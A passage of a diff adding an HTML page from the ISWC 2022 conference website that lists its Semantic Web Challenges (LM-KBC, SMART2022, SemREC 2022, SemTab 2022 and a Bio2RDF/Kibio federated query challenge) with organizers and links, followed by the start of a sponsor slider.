+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-198"><a href="./../industry-track-pc/index.html">Industry Track PC</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-197"><a href="./../poster-demos-track-pc/index.html">Poster &#038; Demo Track PC</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-196"><a href="./../doctoral-consortium-program-committee/index.html">Doctoral Consortium PC</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-375"><a href="./../code-of-conduct/index.html">Code of Conduct</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1863"><a href="./../job-postings/index.html">Job Postings/Fair</a></li>
+</ul>
+<div id="mobile-menu-search" class="clr">
+	<form aria-label="Search this website" method="get" action="https://iswc2022.semanticweb.org/" class="mobile-searchform">
+		<input aria-label="Insert search query" value="" class="field" id="ocean-mobile-search-1" type="search" name="s" autocomplete="off" placeholder="Search">
+		<button aria-label="Submit search" type="submit" class="searchform-submit">
+			<i class=" icon-magnifier" aria-hidden="true" role="img"></i>		</button>
+					</form>
+</div>
+<!-- .mobile-menu-search -->
+
+	</nav>
+
+</div>
+
+			
+			
+					<div class="overlay-header-media"></div>
+			
+		
+</header><!-- #site-header -->
+
+
+			
+			<main id="main" class="site-main clr" role="main">
+
+				
+	
+	<div id="content-wrap" class="container clr">
+
+		
+		<div id="primary" class="content-area clr">
+
+			
+			<div id="content" class="site-content clr">
+
+				
+				
+<article class="single-page-article clr">
+
+	
+<div class="entry clr" itemprop="text">
+
+	
+			<div data-elementor-type="wp-page" data-elementor-id="1217" class="elementor elementor-1217">
+									<section class="elementor-section elementor-top-section elementor-element elementor-element-ca82374 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="ca82374" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-77056b8" data-id="77056b8" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+								<div class="elementor-element elementor-element-fc24ca8 elementor-widget elementor-widget-heading" data-id="fc24ca8" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<style>/*! elementor - v3.17.0 - 08-11-2023 */
+.elementor-heading-title{padding:0;margin:0;line-height:1}.elementor-widget-heading .elementor-heading-title[class*=elementor-size-]>a{color:inherit;font-size:inherit;line-height:inherit}.elementor-widget-heading .elementor-heading-title.elementor-size-small{font-size:15px}.elementor-widget-heading .elementor-heading-title.elementor-size-medium{font-size:19px}.elementor-widget-heading .elementor-heading-title.elementor-size-large{font-size:29px}.elementor-widget-heading .elementor-heading-title.elementor-size-xl{font-size:39px}.elementor-widget-heading .elementor-heading-title.elementor-size-xxl{font-size:59px}</style>
+<h2 class="elementor-heading-title elementor-size-default">Semantic Web Challenges</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-bb6c326 elementor-widget elementor-widget-spacer" data-id="bb6c326" data-element_type="widget" data-widget_type="spacer.default">
+				<div class="elementor-widget-container">
+			<style>/*! elementor - v3.17.0 - 08-11-2023 */
+.elementor-column .elementor-spacer-inner{height:var(--spacer-size)}.e-con{--container-widget-width:100%}.e-con-inner>.elementor-widget-spacer,.e-con>.elementor-widget-spacer{width:var(--container-widget-width,var(--spacer-size));--align-self:var(--container-widget-align-self,initial);--flex-shrink:0}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container,.e-con>.elementor-widget-spacer>.elementor-widget-container{height:100%;width:100%}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer,.e-con>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer{height:100%}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer>.elementor-spacer-inner,.e-con>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer>.elementor-spacer-inner{height:var(--container-widget-height,var(--spacer-size))}.e-con-inner>.elementor-widget-spacer.elementor-widget-empty,.e-con>.elementor-widget-spacer.elementor-widget-empty{position:relative;min-height:22px;min-width:22px}.e-con-inner>.elementor-widget-spacer.elementor-widget-empty .elementor-widget-empty-icon,.e-con>.elementor-widget-spacer.elementor-widget-empty .elementor-widget-empty-icon{position:absolute;top:0;bottom:0;left:0;right:0;margin:auto;padding:0;width:22px;height:22px}</style>		<div class="elementor-spacer">
+			<div class="elementor-spacer-inner"></div>
+		</div>
+				</div>
+				</div>
+					</div>
+		</div>
+							</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-76a80da elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="76a80da" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-14169df" data-id="14169df" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+								<div class="elementor-element elementor-element-342e10a elementor-widget elementor-widget-heading" data-id="342e10a" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">Knowledge Base Construction from Pre-trained Language Models (LM-KBC)<img decoding="async" src="./../../wp-content/uploads/2022/05/new.png" alt=" " height="20" width="40">
+</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-455a68c elementor-widget elementor-widget-text-editor" data-id="455a68c" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+			<style>/*! elementor - v3.17.0 - 08-11-2023 */
+.elementor-widget-text-editor.elementor-drop-cap-view-stacked .elementor-drop-cap{background-color:#69727d;color:#fff}.elementor-widget-text-editor.elementor-drop-cap-view-framed .elementor-drop-cap{color:#69727d;border:3px solid;background-color:transparent}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap{margin-top:8px}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap-letter{width:1em;height:1em}.elementor-widget-text-editor .elementor-drop-cap{float:left;text-align:center;line-height:1;font-size:50px}.elementor-widget-text-editor .elementor-drop-cap-letter{display:inline-block}</style>				<b>Organizer</b>: Sneha Singhania, Tuan-Phong Nguyen, Simon Razniewski
+<br>
+<br>
+
+Pre-trained language models (LMs) have advanced a range of semantic tasks and have also shown promise for knowledge extraction from the models itself. Although several works have explored this ability in a setting called probing or prompting, the viability of knowledge base construction from LMs has not yet been explored. In this challenge, participants are asked to build actual knowledge bases from LMs, for given subjects and relations. In crucial difference to existing probing benchmarks like LAMA (Petroni et al., 2019), we make no simplifying assumptions on relation cardinalities, i.e., a subject-entity can stand in relation with zero, one, or many object-entities. Furthermore, submissions need to go beyond just ranking the predictions, and materialize outputs, which are evaluated by established KB metrics of precision and recall. The challenge comes with two tracks: (i) a BERT-type LM track with low computational requirements, and (ii) an open track, where participants can use any LM of their choice.
+
+<br>
+<br>
+
+<b>Website: </b><a href="http://lm-kbc.github.io/">
+http://lm-kbc.github.io</a>						</div>
+				</div>
+					</div>
+		</div>
+							</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-7191fe9 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="7191fe9" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-24c00f8" data-id="24c00f8" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+								<div class="elementor-element elementor-element-116f1a8 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="116f1a8" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+			<style>/*! elementor - v3.17.0 - 08-11-2023 */
+.elementor-widget-divider{--divider-border-style:none;--divider-border-width:1px;--divider-color:#0c0d0e;--divider-icon-size:20px;--divider-element-spacing:10px;--divider-pattern-height:24px;--divider-pattern-size:20px;--divider-pattern-url:none;--divider-pattern-repeat:repeat-x}.elementor-widget-divider .elementor-divider{display:flex}.elementor-widget-divider .elementor-divider__text{font-size:15px;line-height:1;max-width:95%}.elementor-widget-divider .elementor-divider__element{margin:0 var(--divider-element-spacing);flex-shrink:0}.elementor-widget-divider .elementor-icon{font-size:var(--divider-icon-size)}.elementor-widget-divider .elementor-divider-separator{display:flex;margin:0;direction:ltr}.elementor-widget-divider--view-line_icon .elementor-divider-separator,.elementor-widget-divider--view-line_text .elementor-divider-separator{align-items:center}.elementor-widget-divider--view-line_icon .elementor-divider-separator:after,.elementor-widget-divider--view-line_icon .elementor-divider-separator:before,.elementor-widget-divider--view-line_text .elementor-divider-separator:after,.elementor-widget-divider--view-line_text .elementor-divider-separator:before{display:block;content:"";border-bottom:0;flex-grow:1;border-top:var(--divider-border-width) var(--divider-border-style) var(--divider-color)}.elementor-widget-divider--element-align-left .elementor-divider .elementor-divider-separator>.elementor-divider__svg:first-of-type{flex-grow:0;flex-shrink:100}.elementor-widget-divider--element-align-left .elementor-divider-separator:before{content:none}.elementor-widget-divider--element-align-left .elementor-divider__element{margin-left:0}.elementor-widget-divider--element-align-right .elementor-divider .elementor-divider-separator>.elementor-divider__svg:last-of-type{flex-grow:0;flex-shrink:100}.elementor-widget-divider--element-align-right .elementor-divider-separator:after{content:none}.elementor-widget-divider--element-align-right .elementor-divider__element{margin-right:0}.elementor-widget-divider:not(.elementor-widget-divider--view-line_text):not(.elementor-widget-divider--view-line_icon) .elementor-divider-separator{border-top:var(--divider-border-width) var(--divider-border-style) var(--divider-color)}.elementor-widget-divider--separator-type-pattern{--divider-border-style:none}.elementor-widget-divider--separator-type-pattern.elementor-widget-divider--view-line .elementor-divider-separator,.elementor-widget-divider--separator-type-pattern:not(.elementor-widget-divider--view-line) .elementor-divider-separator:after,.elementor-widget-divider--separator-type-pattern:not(.elementor-widget-divider--view-line) .elementor-divider-separator:before,.elementor-widget-divider--separator-type-pattern:not([class*=elementor-widget-divider--view]) .elementor-divider-separator{width:100%;min-height:var(--divider-pattern-height);-webkit-mask-size:var(--divider-pattern-size) 100%;mask-size:var(--divider-pattern-size) 100%;-webkit-mask-repeat:var(--divider-pattern-repeat);mask-repeat:var(--divider-pattern-repeat);background-color:var(--divider-color);-webkit-mask-image:var(--divider-pattern-url);mask-image:var(--divider-pattern-url)}.elementor-widget-divider--no-spacing{--divider-pattern-size:auto}.elementor-widget-divider--bg-round{--divider-pattern-repeat:round}.rtl .elementor-widget-divider .elementor-divider__text{direction:rtl}.e-con-inner>.elementor-widget-divider,.e-con>.elementor-widget-divider{width:var(--container-widget-width,100%);--flex-grow:var(--container-widget-flex-grow)}</style>		<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+					</div>
+		</div>
+							</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-3ee3fc4 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3ee3fc4" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-18ffea3" data-id="18ffea3" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+								<div class="elementor-element elementor-element-27cdaa0 elementor-widget elementor-widget-heading" data-id="27cdaa0" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">Semantic Answer Type, Entity, and Relation Linking Task (SMART2022) <img decoding="async" src="./../../wp-content/uploads/2022/05/3rd.png" alt=" " height="20" width="40">
+</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-6e61d0a elementor-widget elementor-widget-text-editor" data-id="6e61d0a" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+							<b>Organizer</b>: Nandana Mihindukulasooriya, Mohnish Dubey, Alﬁo Gliozzo, Jens Lehmann, Axel-Cyrille Ngonga Ngomo, Ricardo Usbeck, Gaetano Rossiello and Debayan Banerjee
+<br>
+<br>
+
+The challenge, SMART 2022, consists of three tasks Semantic Answer Type prediction task, Entity and Relation Linking tasks. Given a question in natural language, the three tasks in this challenge are to predict the answer type for a given question, identify entities and relations in the questions using a target ontology (e.g., DBpedia or Wikidata). This is a continuation of SMART2020, and SMART2021 challenges.
+<br>
+<br>
+
+<b>Website: </b><a href="https://smart-task.github.io/">https://smart-task.github.io/</a>						</div>
+				</div>
+					</div>
+		</div>
+							</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-ac70f58 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="ac70f58" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-86c881f" data-id="86c881f" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+								<div class="elementor-element elementor-element-f991ffa elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="f991ffa" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+					</div>
+		</div>
+							</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-10927bf elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="10927bf" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-f5c4e4a" data-id="f5c4e4a" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+								<div class="elementor-element elementor-element-d486b46 elementor-widget elementor-widget-heading" data-id="d486b46" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">Semantic Reasoning Evaluation Challenge (SemREC 2022) <img decoding="async" src="./../../wp-content/uploads/2022/05/2nd.png" alt=" " height="20" width="40">
+</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-e3b5178 elementor-widget elementor-widget-text-editor" data-id="e3b5178" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+							<b>Organizer</b>: 
+Gunjan Singh, Raghava Mutharaju, Pavan Kapanipathi
+
+<br>
+<br>
+Despite the development of several ontology reasoning optimizations, the traditional methods either do not scale well or only cover a subset of OWL 2 language constructs. As an alternative, neuro-symbolic approaches are gaining significant attention. However, the existing methods can not deal with very expressive ontology languages. Other than that, some SPARQL query engines also support reasoning, but their performance also is still limited. To find and improve these performance bottlenecks of the reasons, we ideally need several real-world ontologies that span the broad spectrum in terms of their size and expressivity. However, that is often not the case. One of the potential reasons for the ontology developers to not build ontologies that vary in terms of size and expressivity is the performance bottleneck of the reasons. SemREC aims to deal with this chicken and egg problem.
+<br>
+The second edition of this challenge includes the following tasks-
+<br>
+Task-1. Ontologies.
+<br>
+Submit a real-world ontology that is a challenge in
+terms of the reasoning time or memory consumed during reasoning.
+<br>
+Task-2. Systems.
+<br>
+Submit an ontology/RDFS reasoner that uses neural-symbolic techniques or SPARQL query engines that support reasoning.
+ 
+<br>
+<br>
+
+<b>Website: </b><a href="https://semrec.github.io/">
+https://semrec.github.io/</a>						</div>
+				</div>
+					</div>
+		</div>
+							</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-00ea815 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="00ea815" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-13a4a2c" data-id="13a4a2c" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+								<div class="elementor-element elementor-element-755962c elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="755962c" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+					</div>
+		</div>
+							</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-1171a40 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="1171a40" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-5355aeb" data-id="5355aeb" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+								<div class="elementor-element elementor-element-2e7722d elementor-widget elementor-widget-heading" data-id="2e7722d" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">Semantic Web Challenge on Tabular Data to Knowledge Graph Matching (SemTab 2022) <img loading="lazy" decoding="async" src="./../../wp-content/uploads/2022/05/4th.png" alt=" " height="20" width="40">
+</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-ab190da elementor-widget elementor-widget-text-editor" data-id="ab190da" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+							<p><b>Organizer</b>: Nora Abdelmageed, Jiaoyan Chen, Vincenzo Cutrona, Vasilis Efthymiou, Oktie Hassanzadeh, Madelon Hulsebos, Ernesto Jimenez-Ruiz, Juan F. Sequeda, Kavitha Srinivas</p>
+<p>This challenge aims at benchmarking systems dealing with the tabular data to KG matching problem, so as to facilitate their comparison on the same basis and the reproducibility of the results.</p>
+<p><b>Website: </b><a href="https://www.cs.ox.ac.uk/isg/challenges/sem-tab/">https://www.cs.ox.ac.uk/isg/challenges/sem-tab/</a></p>						</div>
+				</div>
+					</div>
+		</div>
+							</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-ec05e54 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="ec05e54" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-be8daf6" data-id="be8daf6" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+								<div class="elementor-element elementor-element-7f9aed1 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="7f9aed1" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-d359fa6 elementor-widget elementor-widget-heading" data-id="d359fa6" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">Bio2RDF and Kibio federated query in Life Science challenge </h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-29eed07 elementor-widget elementor-widget-text-editor" data-id="29eed07" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+							<p><b>Organizer</b>: François Belleau, Mickael Leclerc, Régis Ongaro-Carcy, Arnaud Droit</p>
+<p>How can we run the Wikidata FAIR paper query without using Wikidata SPARQL endpoint (https://tinyurl.com/53ra32bp)? Participants must obtain the same results by using federated query techniques.</p>
+<p>Two different tasks are proposed, participant select one:<br>(1)Running Wikidata query using federated SPARQL query or other programming approach that will consume Bio2RDF’s endpoints.<br>(2)Running Wikidata query using any programming approach that will consume Kibio’s Elasticsearch indexes.</p>
+<p>Both endpoints, Bio2RDF and Kibio, store the same datasets extracted from the Wikidata JSON dump. Bio2RDF exposing SPARQL endpoints and RDF triples, Kibio.science exposing Elasticsearch standard API and JSON-LD documents.</p>
+<p><strong>Website</strong>:http://kibio.science/iswc2022</p>						</div>
+				</div>
+					</div>
+		</div>
+							</div>
+		</section>
+							</div>
+		
+	
+</div>
+
+</article>
+
+				
+			</div>
+<!-- #content -->
+
+			
+		</div>
+<!-- #primary -->
+
+		
+	</div>
+<!-- #content-wrap -->
+
+	
+
+	</main><!-- #main -->
+
+	
+	
+	
+		
+<footer id="footer" class="site-footer" itemscope="itemscope" itemtype="https://schema.org/WPFooter" role="contentinfo">
+
+	
+	<div id="footer-inner" class="clr">
+
+		
+
+<div id="footer-widgets" class="oceanwp-row clr">
+
+	
+	<div class="footer-widgets-inner container">
+
+					<div class="footer-box span_1_of_1 col col-1">
+				<div id="block-12" class="footer-widget widget_block clr"><div class="n2-section-smartslider fitvidsignore  n2_clear" data-ssid="4">
+<div id="n2-ss-4-align" class="n2-ss-align"><div class="n2-padding">
+<div id="n2-ss-4" data-creator="Smart Slider 3" data-responsive="auto" class="n2-ss-slider n2-ow n2-has-hover n2notransition  ">
+
+
+
+<div class="n2-ss-slider-wrapper-inside">
+        <div class="n2-ss-slider-1 n2_ss__touch_element n2-ow">
+            <div class="n2-ss-slider-2 n2-ow">
+                                                <div class="n2-ss-slider-3 n2-ow">
+
+                    <div class="n2-ss-slide-backgrounds n2-ow-all">
+<div class="n2-ss-slide-background" data-public-id="1" data-mode="fill"><div data-color="RGBA(255,255,255,0)" style="background-color: RGBA(255,255,255,0);" class="n2-ss-slide-background-color"></div></div>
+<div class="n2-ss-slide-background" data-public-id="2" data-mode="fill"><div data-color="RGBA(255,255,255,0)" style="background-color: RGBA(255,255,255,0);" class="n2-ss-slide-background-color"></div></div>
+<div class="n2-ss-slide-background" data-public-id="3" data-mode="fill"><div data-color="RGBA(255,255,255,0)" style="background-color: RGBA(255,255,255,0);" class="n2-ss-slide-background-color"></div></div>
+<div class="n2-ss-slide-background" data-public-id="4" data-mode="fill"><div data-color="RGBA(255,255,255,0)" style="background-color: RGBA(255,255,255,0);" class="n2-ss-slide-background-color"></div></div>
+<div class="n2-ss-slide-background" data-public-id="5" data-mode="fill"><div data-color="RGBA(255,255,255,0)" style="background-color: RGBA(255,255,255,0);" class="n2-ss-slide-background-color"></div></div>
+<div class="n2-ss-slide-background" data-public-id="6" data-mode="fill"><div data-color="RGBA(255,255,255,0)" style="background-color: RGBA(255,255,255,0);" class="n2-ss-slide-background-color"></div></div>
+<div class="n2-ss-slide-background" data-public-id="7" data-mode="fill"><div data-color="RGBA(255,255,255,0)" style="background-color: RGBA(255,255,255,0);" class="n2-ss-slide-background-color"></div></div>
+<div class="n2-ss-slide-background" data-public-id="8" data-mode="fill"><div data-color="RGBA(255,255,255,0)" style="background-color: RGBA(255,255,255,0);" class="n2-ss-slide-background-color"></div></div>
+</div>                    <div class="n2-ss-slider-4 n2-ow">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1000 300" data-related-device="desktopPortrait" class="n2-ow n2-ss-preserve-size n2-ss-preserve-size--slider n2-ss-slide-limiter"></svg><div data-first="1" data-slide-duration="0" data-id="32" data-slide-public-id="1" data-title="Diamond Sponsors" class="n2-ss-slide n2-ow  n2-ss-slide-32">
+<div role="note" class="n2-ss-slide--focus" tabindex="-1">Diamond Sponsors</div>
+<div class="n2-ss-layers-container n2-ss-slide-limiter n2-ow"><div class="n2-ss-layer n2-ow n-uc-PF8aDioiewiY" data-sstype="slide" data-pm="default"><div class="n2-ss-layer n2-ow n-uc-9lRTWziHHVBY" data-pm="default" data-sstype="content" data-hasbackground="0"><div class="n2-ss-section-main-content n2-ss-layer-with-background n2-ss-layer-content n2-ow n-uc-9lRTWziHHVBY-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-1410e5465e7c1" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-1410e5465e7c1-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-171ef7a6f1f14" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-171ef7a6f1f14-inner"><div class="n2-ss-layer n2-ow n-uc-iUkbhf6f0TQE" data-pm="normal" data-sstype="layer"><div id="n2-ss-4item1" class="n2-font-8c439af5b1447308e4805f29e3c667e0-hover   n2-ss-item-content n2-ss-text n2-ow" style="display:block;">Diamond Sponsors</div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-10212f7445602" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-10212f7445602-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-1165d11049606" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-1165d11049606-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-1c9d168d55b36" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1c9d168d55b36-inner"></div></div>
+<div class="n2-ss-layer n2-ow n-uc-1c8e61e4d1395" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1c8e61e4d1395-inner"><div class="n2-ss-layer n2-ow n-uc-932rmYQJGlWg" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img loading="lazy" decoding="async" id="n2-ss-4item2" alt="" class="skip-lazy" width="242" height="267" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/nonsolus-digital_elsevier.png"></div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-15cf046786c16" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-15cf046786c16-inner"><div class="n2-ss-layer n2-ow n-uc-CufBOUa33bx9" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img loading="lazy" decoding="async" id="n2-ss-4item3" alt="" class="skip-lazy" width="1434" height="533" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/ChinaScope-logo.png"></div></div></div></div>
+</div></div></div></div></div>
+</div></div></div></div></div></div></div>
+</div>
+<div data-slide-duration="0" data-id="41" data-slide-public-id="2" data-title="Platinum Plus Sponsors" class="n2-ss-slide n2-ow  n2-ss-slide-41">
+<div role="note" class="n2-ss-slide--focus" tabindex="-1">Platinum Plus Sponsors</div>
+<div class="n2-ss-layers-container n2-ss-slide-limiter n2-ow"><div class="n2-ss-layer n2-ow n-uc-bSRrEp9EMf51" data-sstype="slide" data-pm="default"><div class="n2-ss-layer n2-ow n-uc-TM527udtdpS6" data-pm="default" data-sstype="content" data-hasbackground="0"><div class="n2-ss-section-main-content n2-ss-layer-with-background n2-ss-layer-content n2-ow n-uc-TM527udtdpS6-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-1411de2cd2d0b" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-1411de2cd2d0b-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-18827cad0be62" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-18827cad0be62-inner"><div class="n2-ss-layer n2-ow n-uc-3mRO6rOg27uT" data-pm="normal" data-sstype="layer"><div id="n2-ss-4item4" class="n2-font-8c439af5b1447308e4805f29e3c667e0-hover   n2-ss-item-content n2-ss-text n2-ow" style="display:block;">Platinum Plus Sponsors</div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-1afacbe1860d5" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1afacbe1860d5-inner"><div class="n2-ss-layer n2-ow n-uc-zvx86OLuCSEh" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item5" alt="" class="skip-lazy" loading="lazy" width="9999" height="2174" data-skip-lazy="1" src="./../../wp-content/uploads/2022/09/IBM_Research_Logo.png"></div></div></div></div>
+<div class="n2-ss-layer n2-ow n-uc-1169d969d1748" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-1169d969d1748-inner"><div class="n2-ss-layer n2-ow n-uc-u9G8J8aq2TVG" data-pm="normal" data-sstype="layer"><div class=" n2-ss-item-image-content n2-ss-item-content n2-ow-all"><img decoding="async" id="n2-ss-4item6" alt="" class="skip-lazy" loading="lazy" width="1874" height="267" data-skip-lazy="1" src="./../../wp-content/uploads/2022/10/00_Videolectures_logo_OUTLINES-1.png"></div></div></div></div>
+</div></div></div></div></div></div></div>
+</div>
+<div data-slide-duration="0" data-id="33" data-slide-public-id="3" data-title="Platinum Sponsors" class="n2-ss-slide n2-ow  n2-ss-slide-33">
+<div role="note" class="n2-ss-slide--focus" tabindex="-1">Platinum Sponsors</div>
+<div class="n2-ss-layers-container n2-ss-slide-limiter n2-ow"><div class="n2-ss-layer n2-ow n-uc-fanh1Vrwlggp" data-sstype="slide" data-pm="default"><div class="n2-ss-layer n2-ow n-uc-38BKnei4mCfk" data-pm="default" data-sstype="content" data-hasbackground="0"><div class="n2-ss-section-main-content n2-ss-layer-with-background n2-ss-layer-content n2-ow n-uc-38BKnei4mCfk-inner"><div class="n2-ss-layer n2-ow n2-ss-layer--block n2-ss-has-self-align n-uc-13f534e3e8fa1" data-pm="normal" data-sstype="row"><div class="n2-ss-layer-row n2-ss-layer-with-background n-uc-13f534e3e8fa1-inner"><div class="n2-ss-layer-row-inner ">
+<div class="n2-ss-layer n2-ow n-uc-10e6a17eed4ba" data-pm="default" data-sstype="col"><div class="n2-ss-layer-col n2-ss-layer-with-background n2-ss-layer-content n-uc-10e6a17eed4ba-inner"><div class="n2-ss-layer n2-ow n-uc-cUzEeRXZyHEr" data-pm="normal" data-sstype="layer"><div id="n2-ss-4item7" class="n2-font-8c439af5b1447308e4805f29e3c667e0-hover   n2-ss-item-content n2-ss-text n2-ow" style="display:block;">Platinum Sponsors</div></div></div></div>
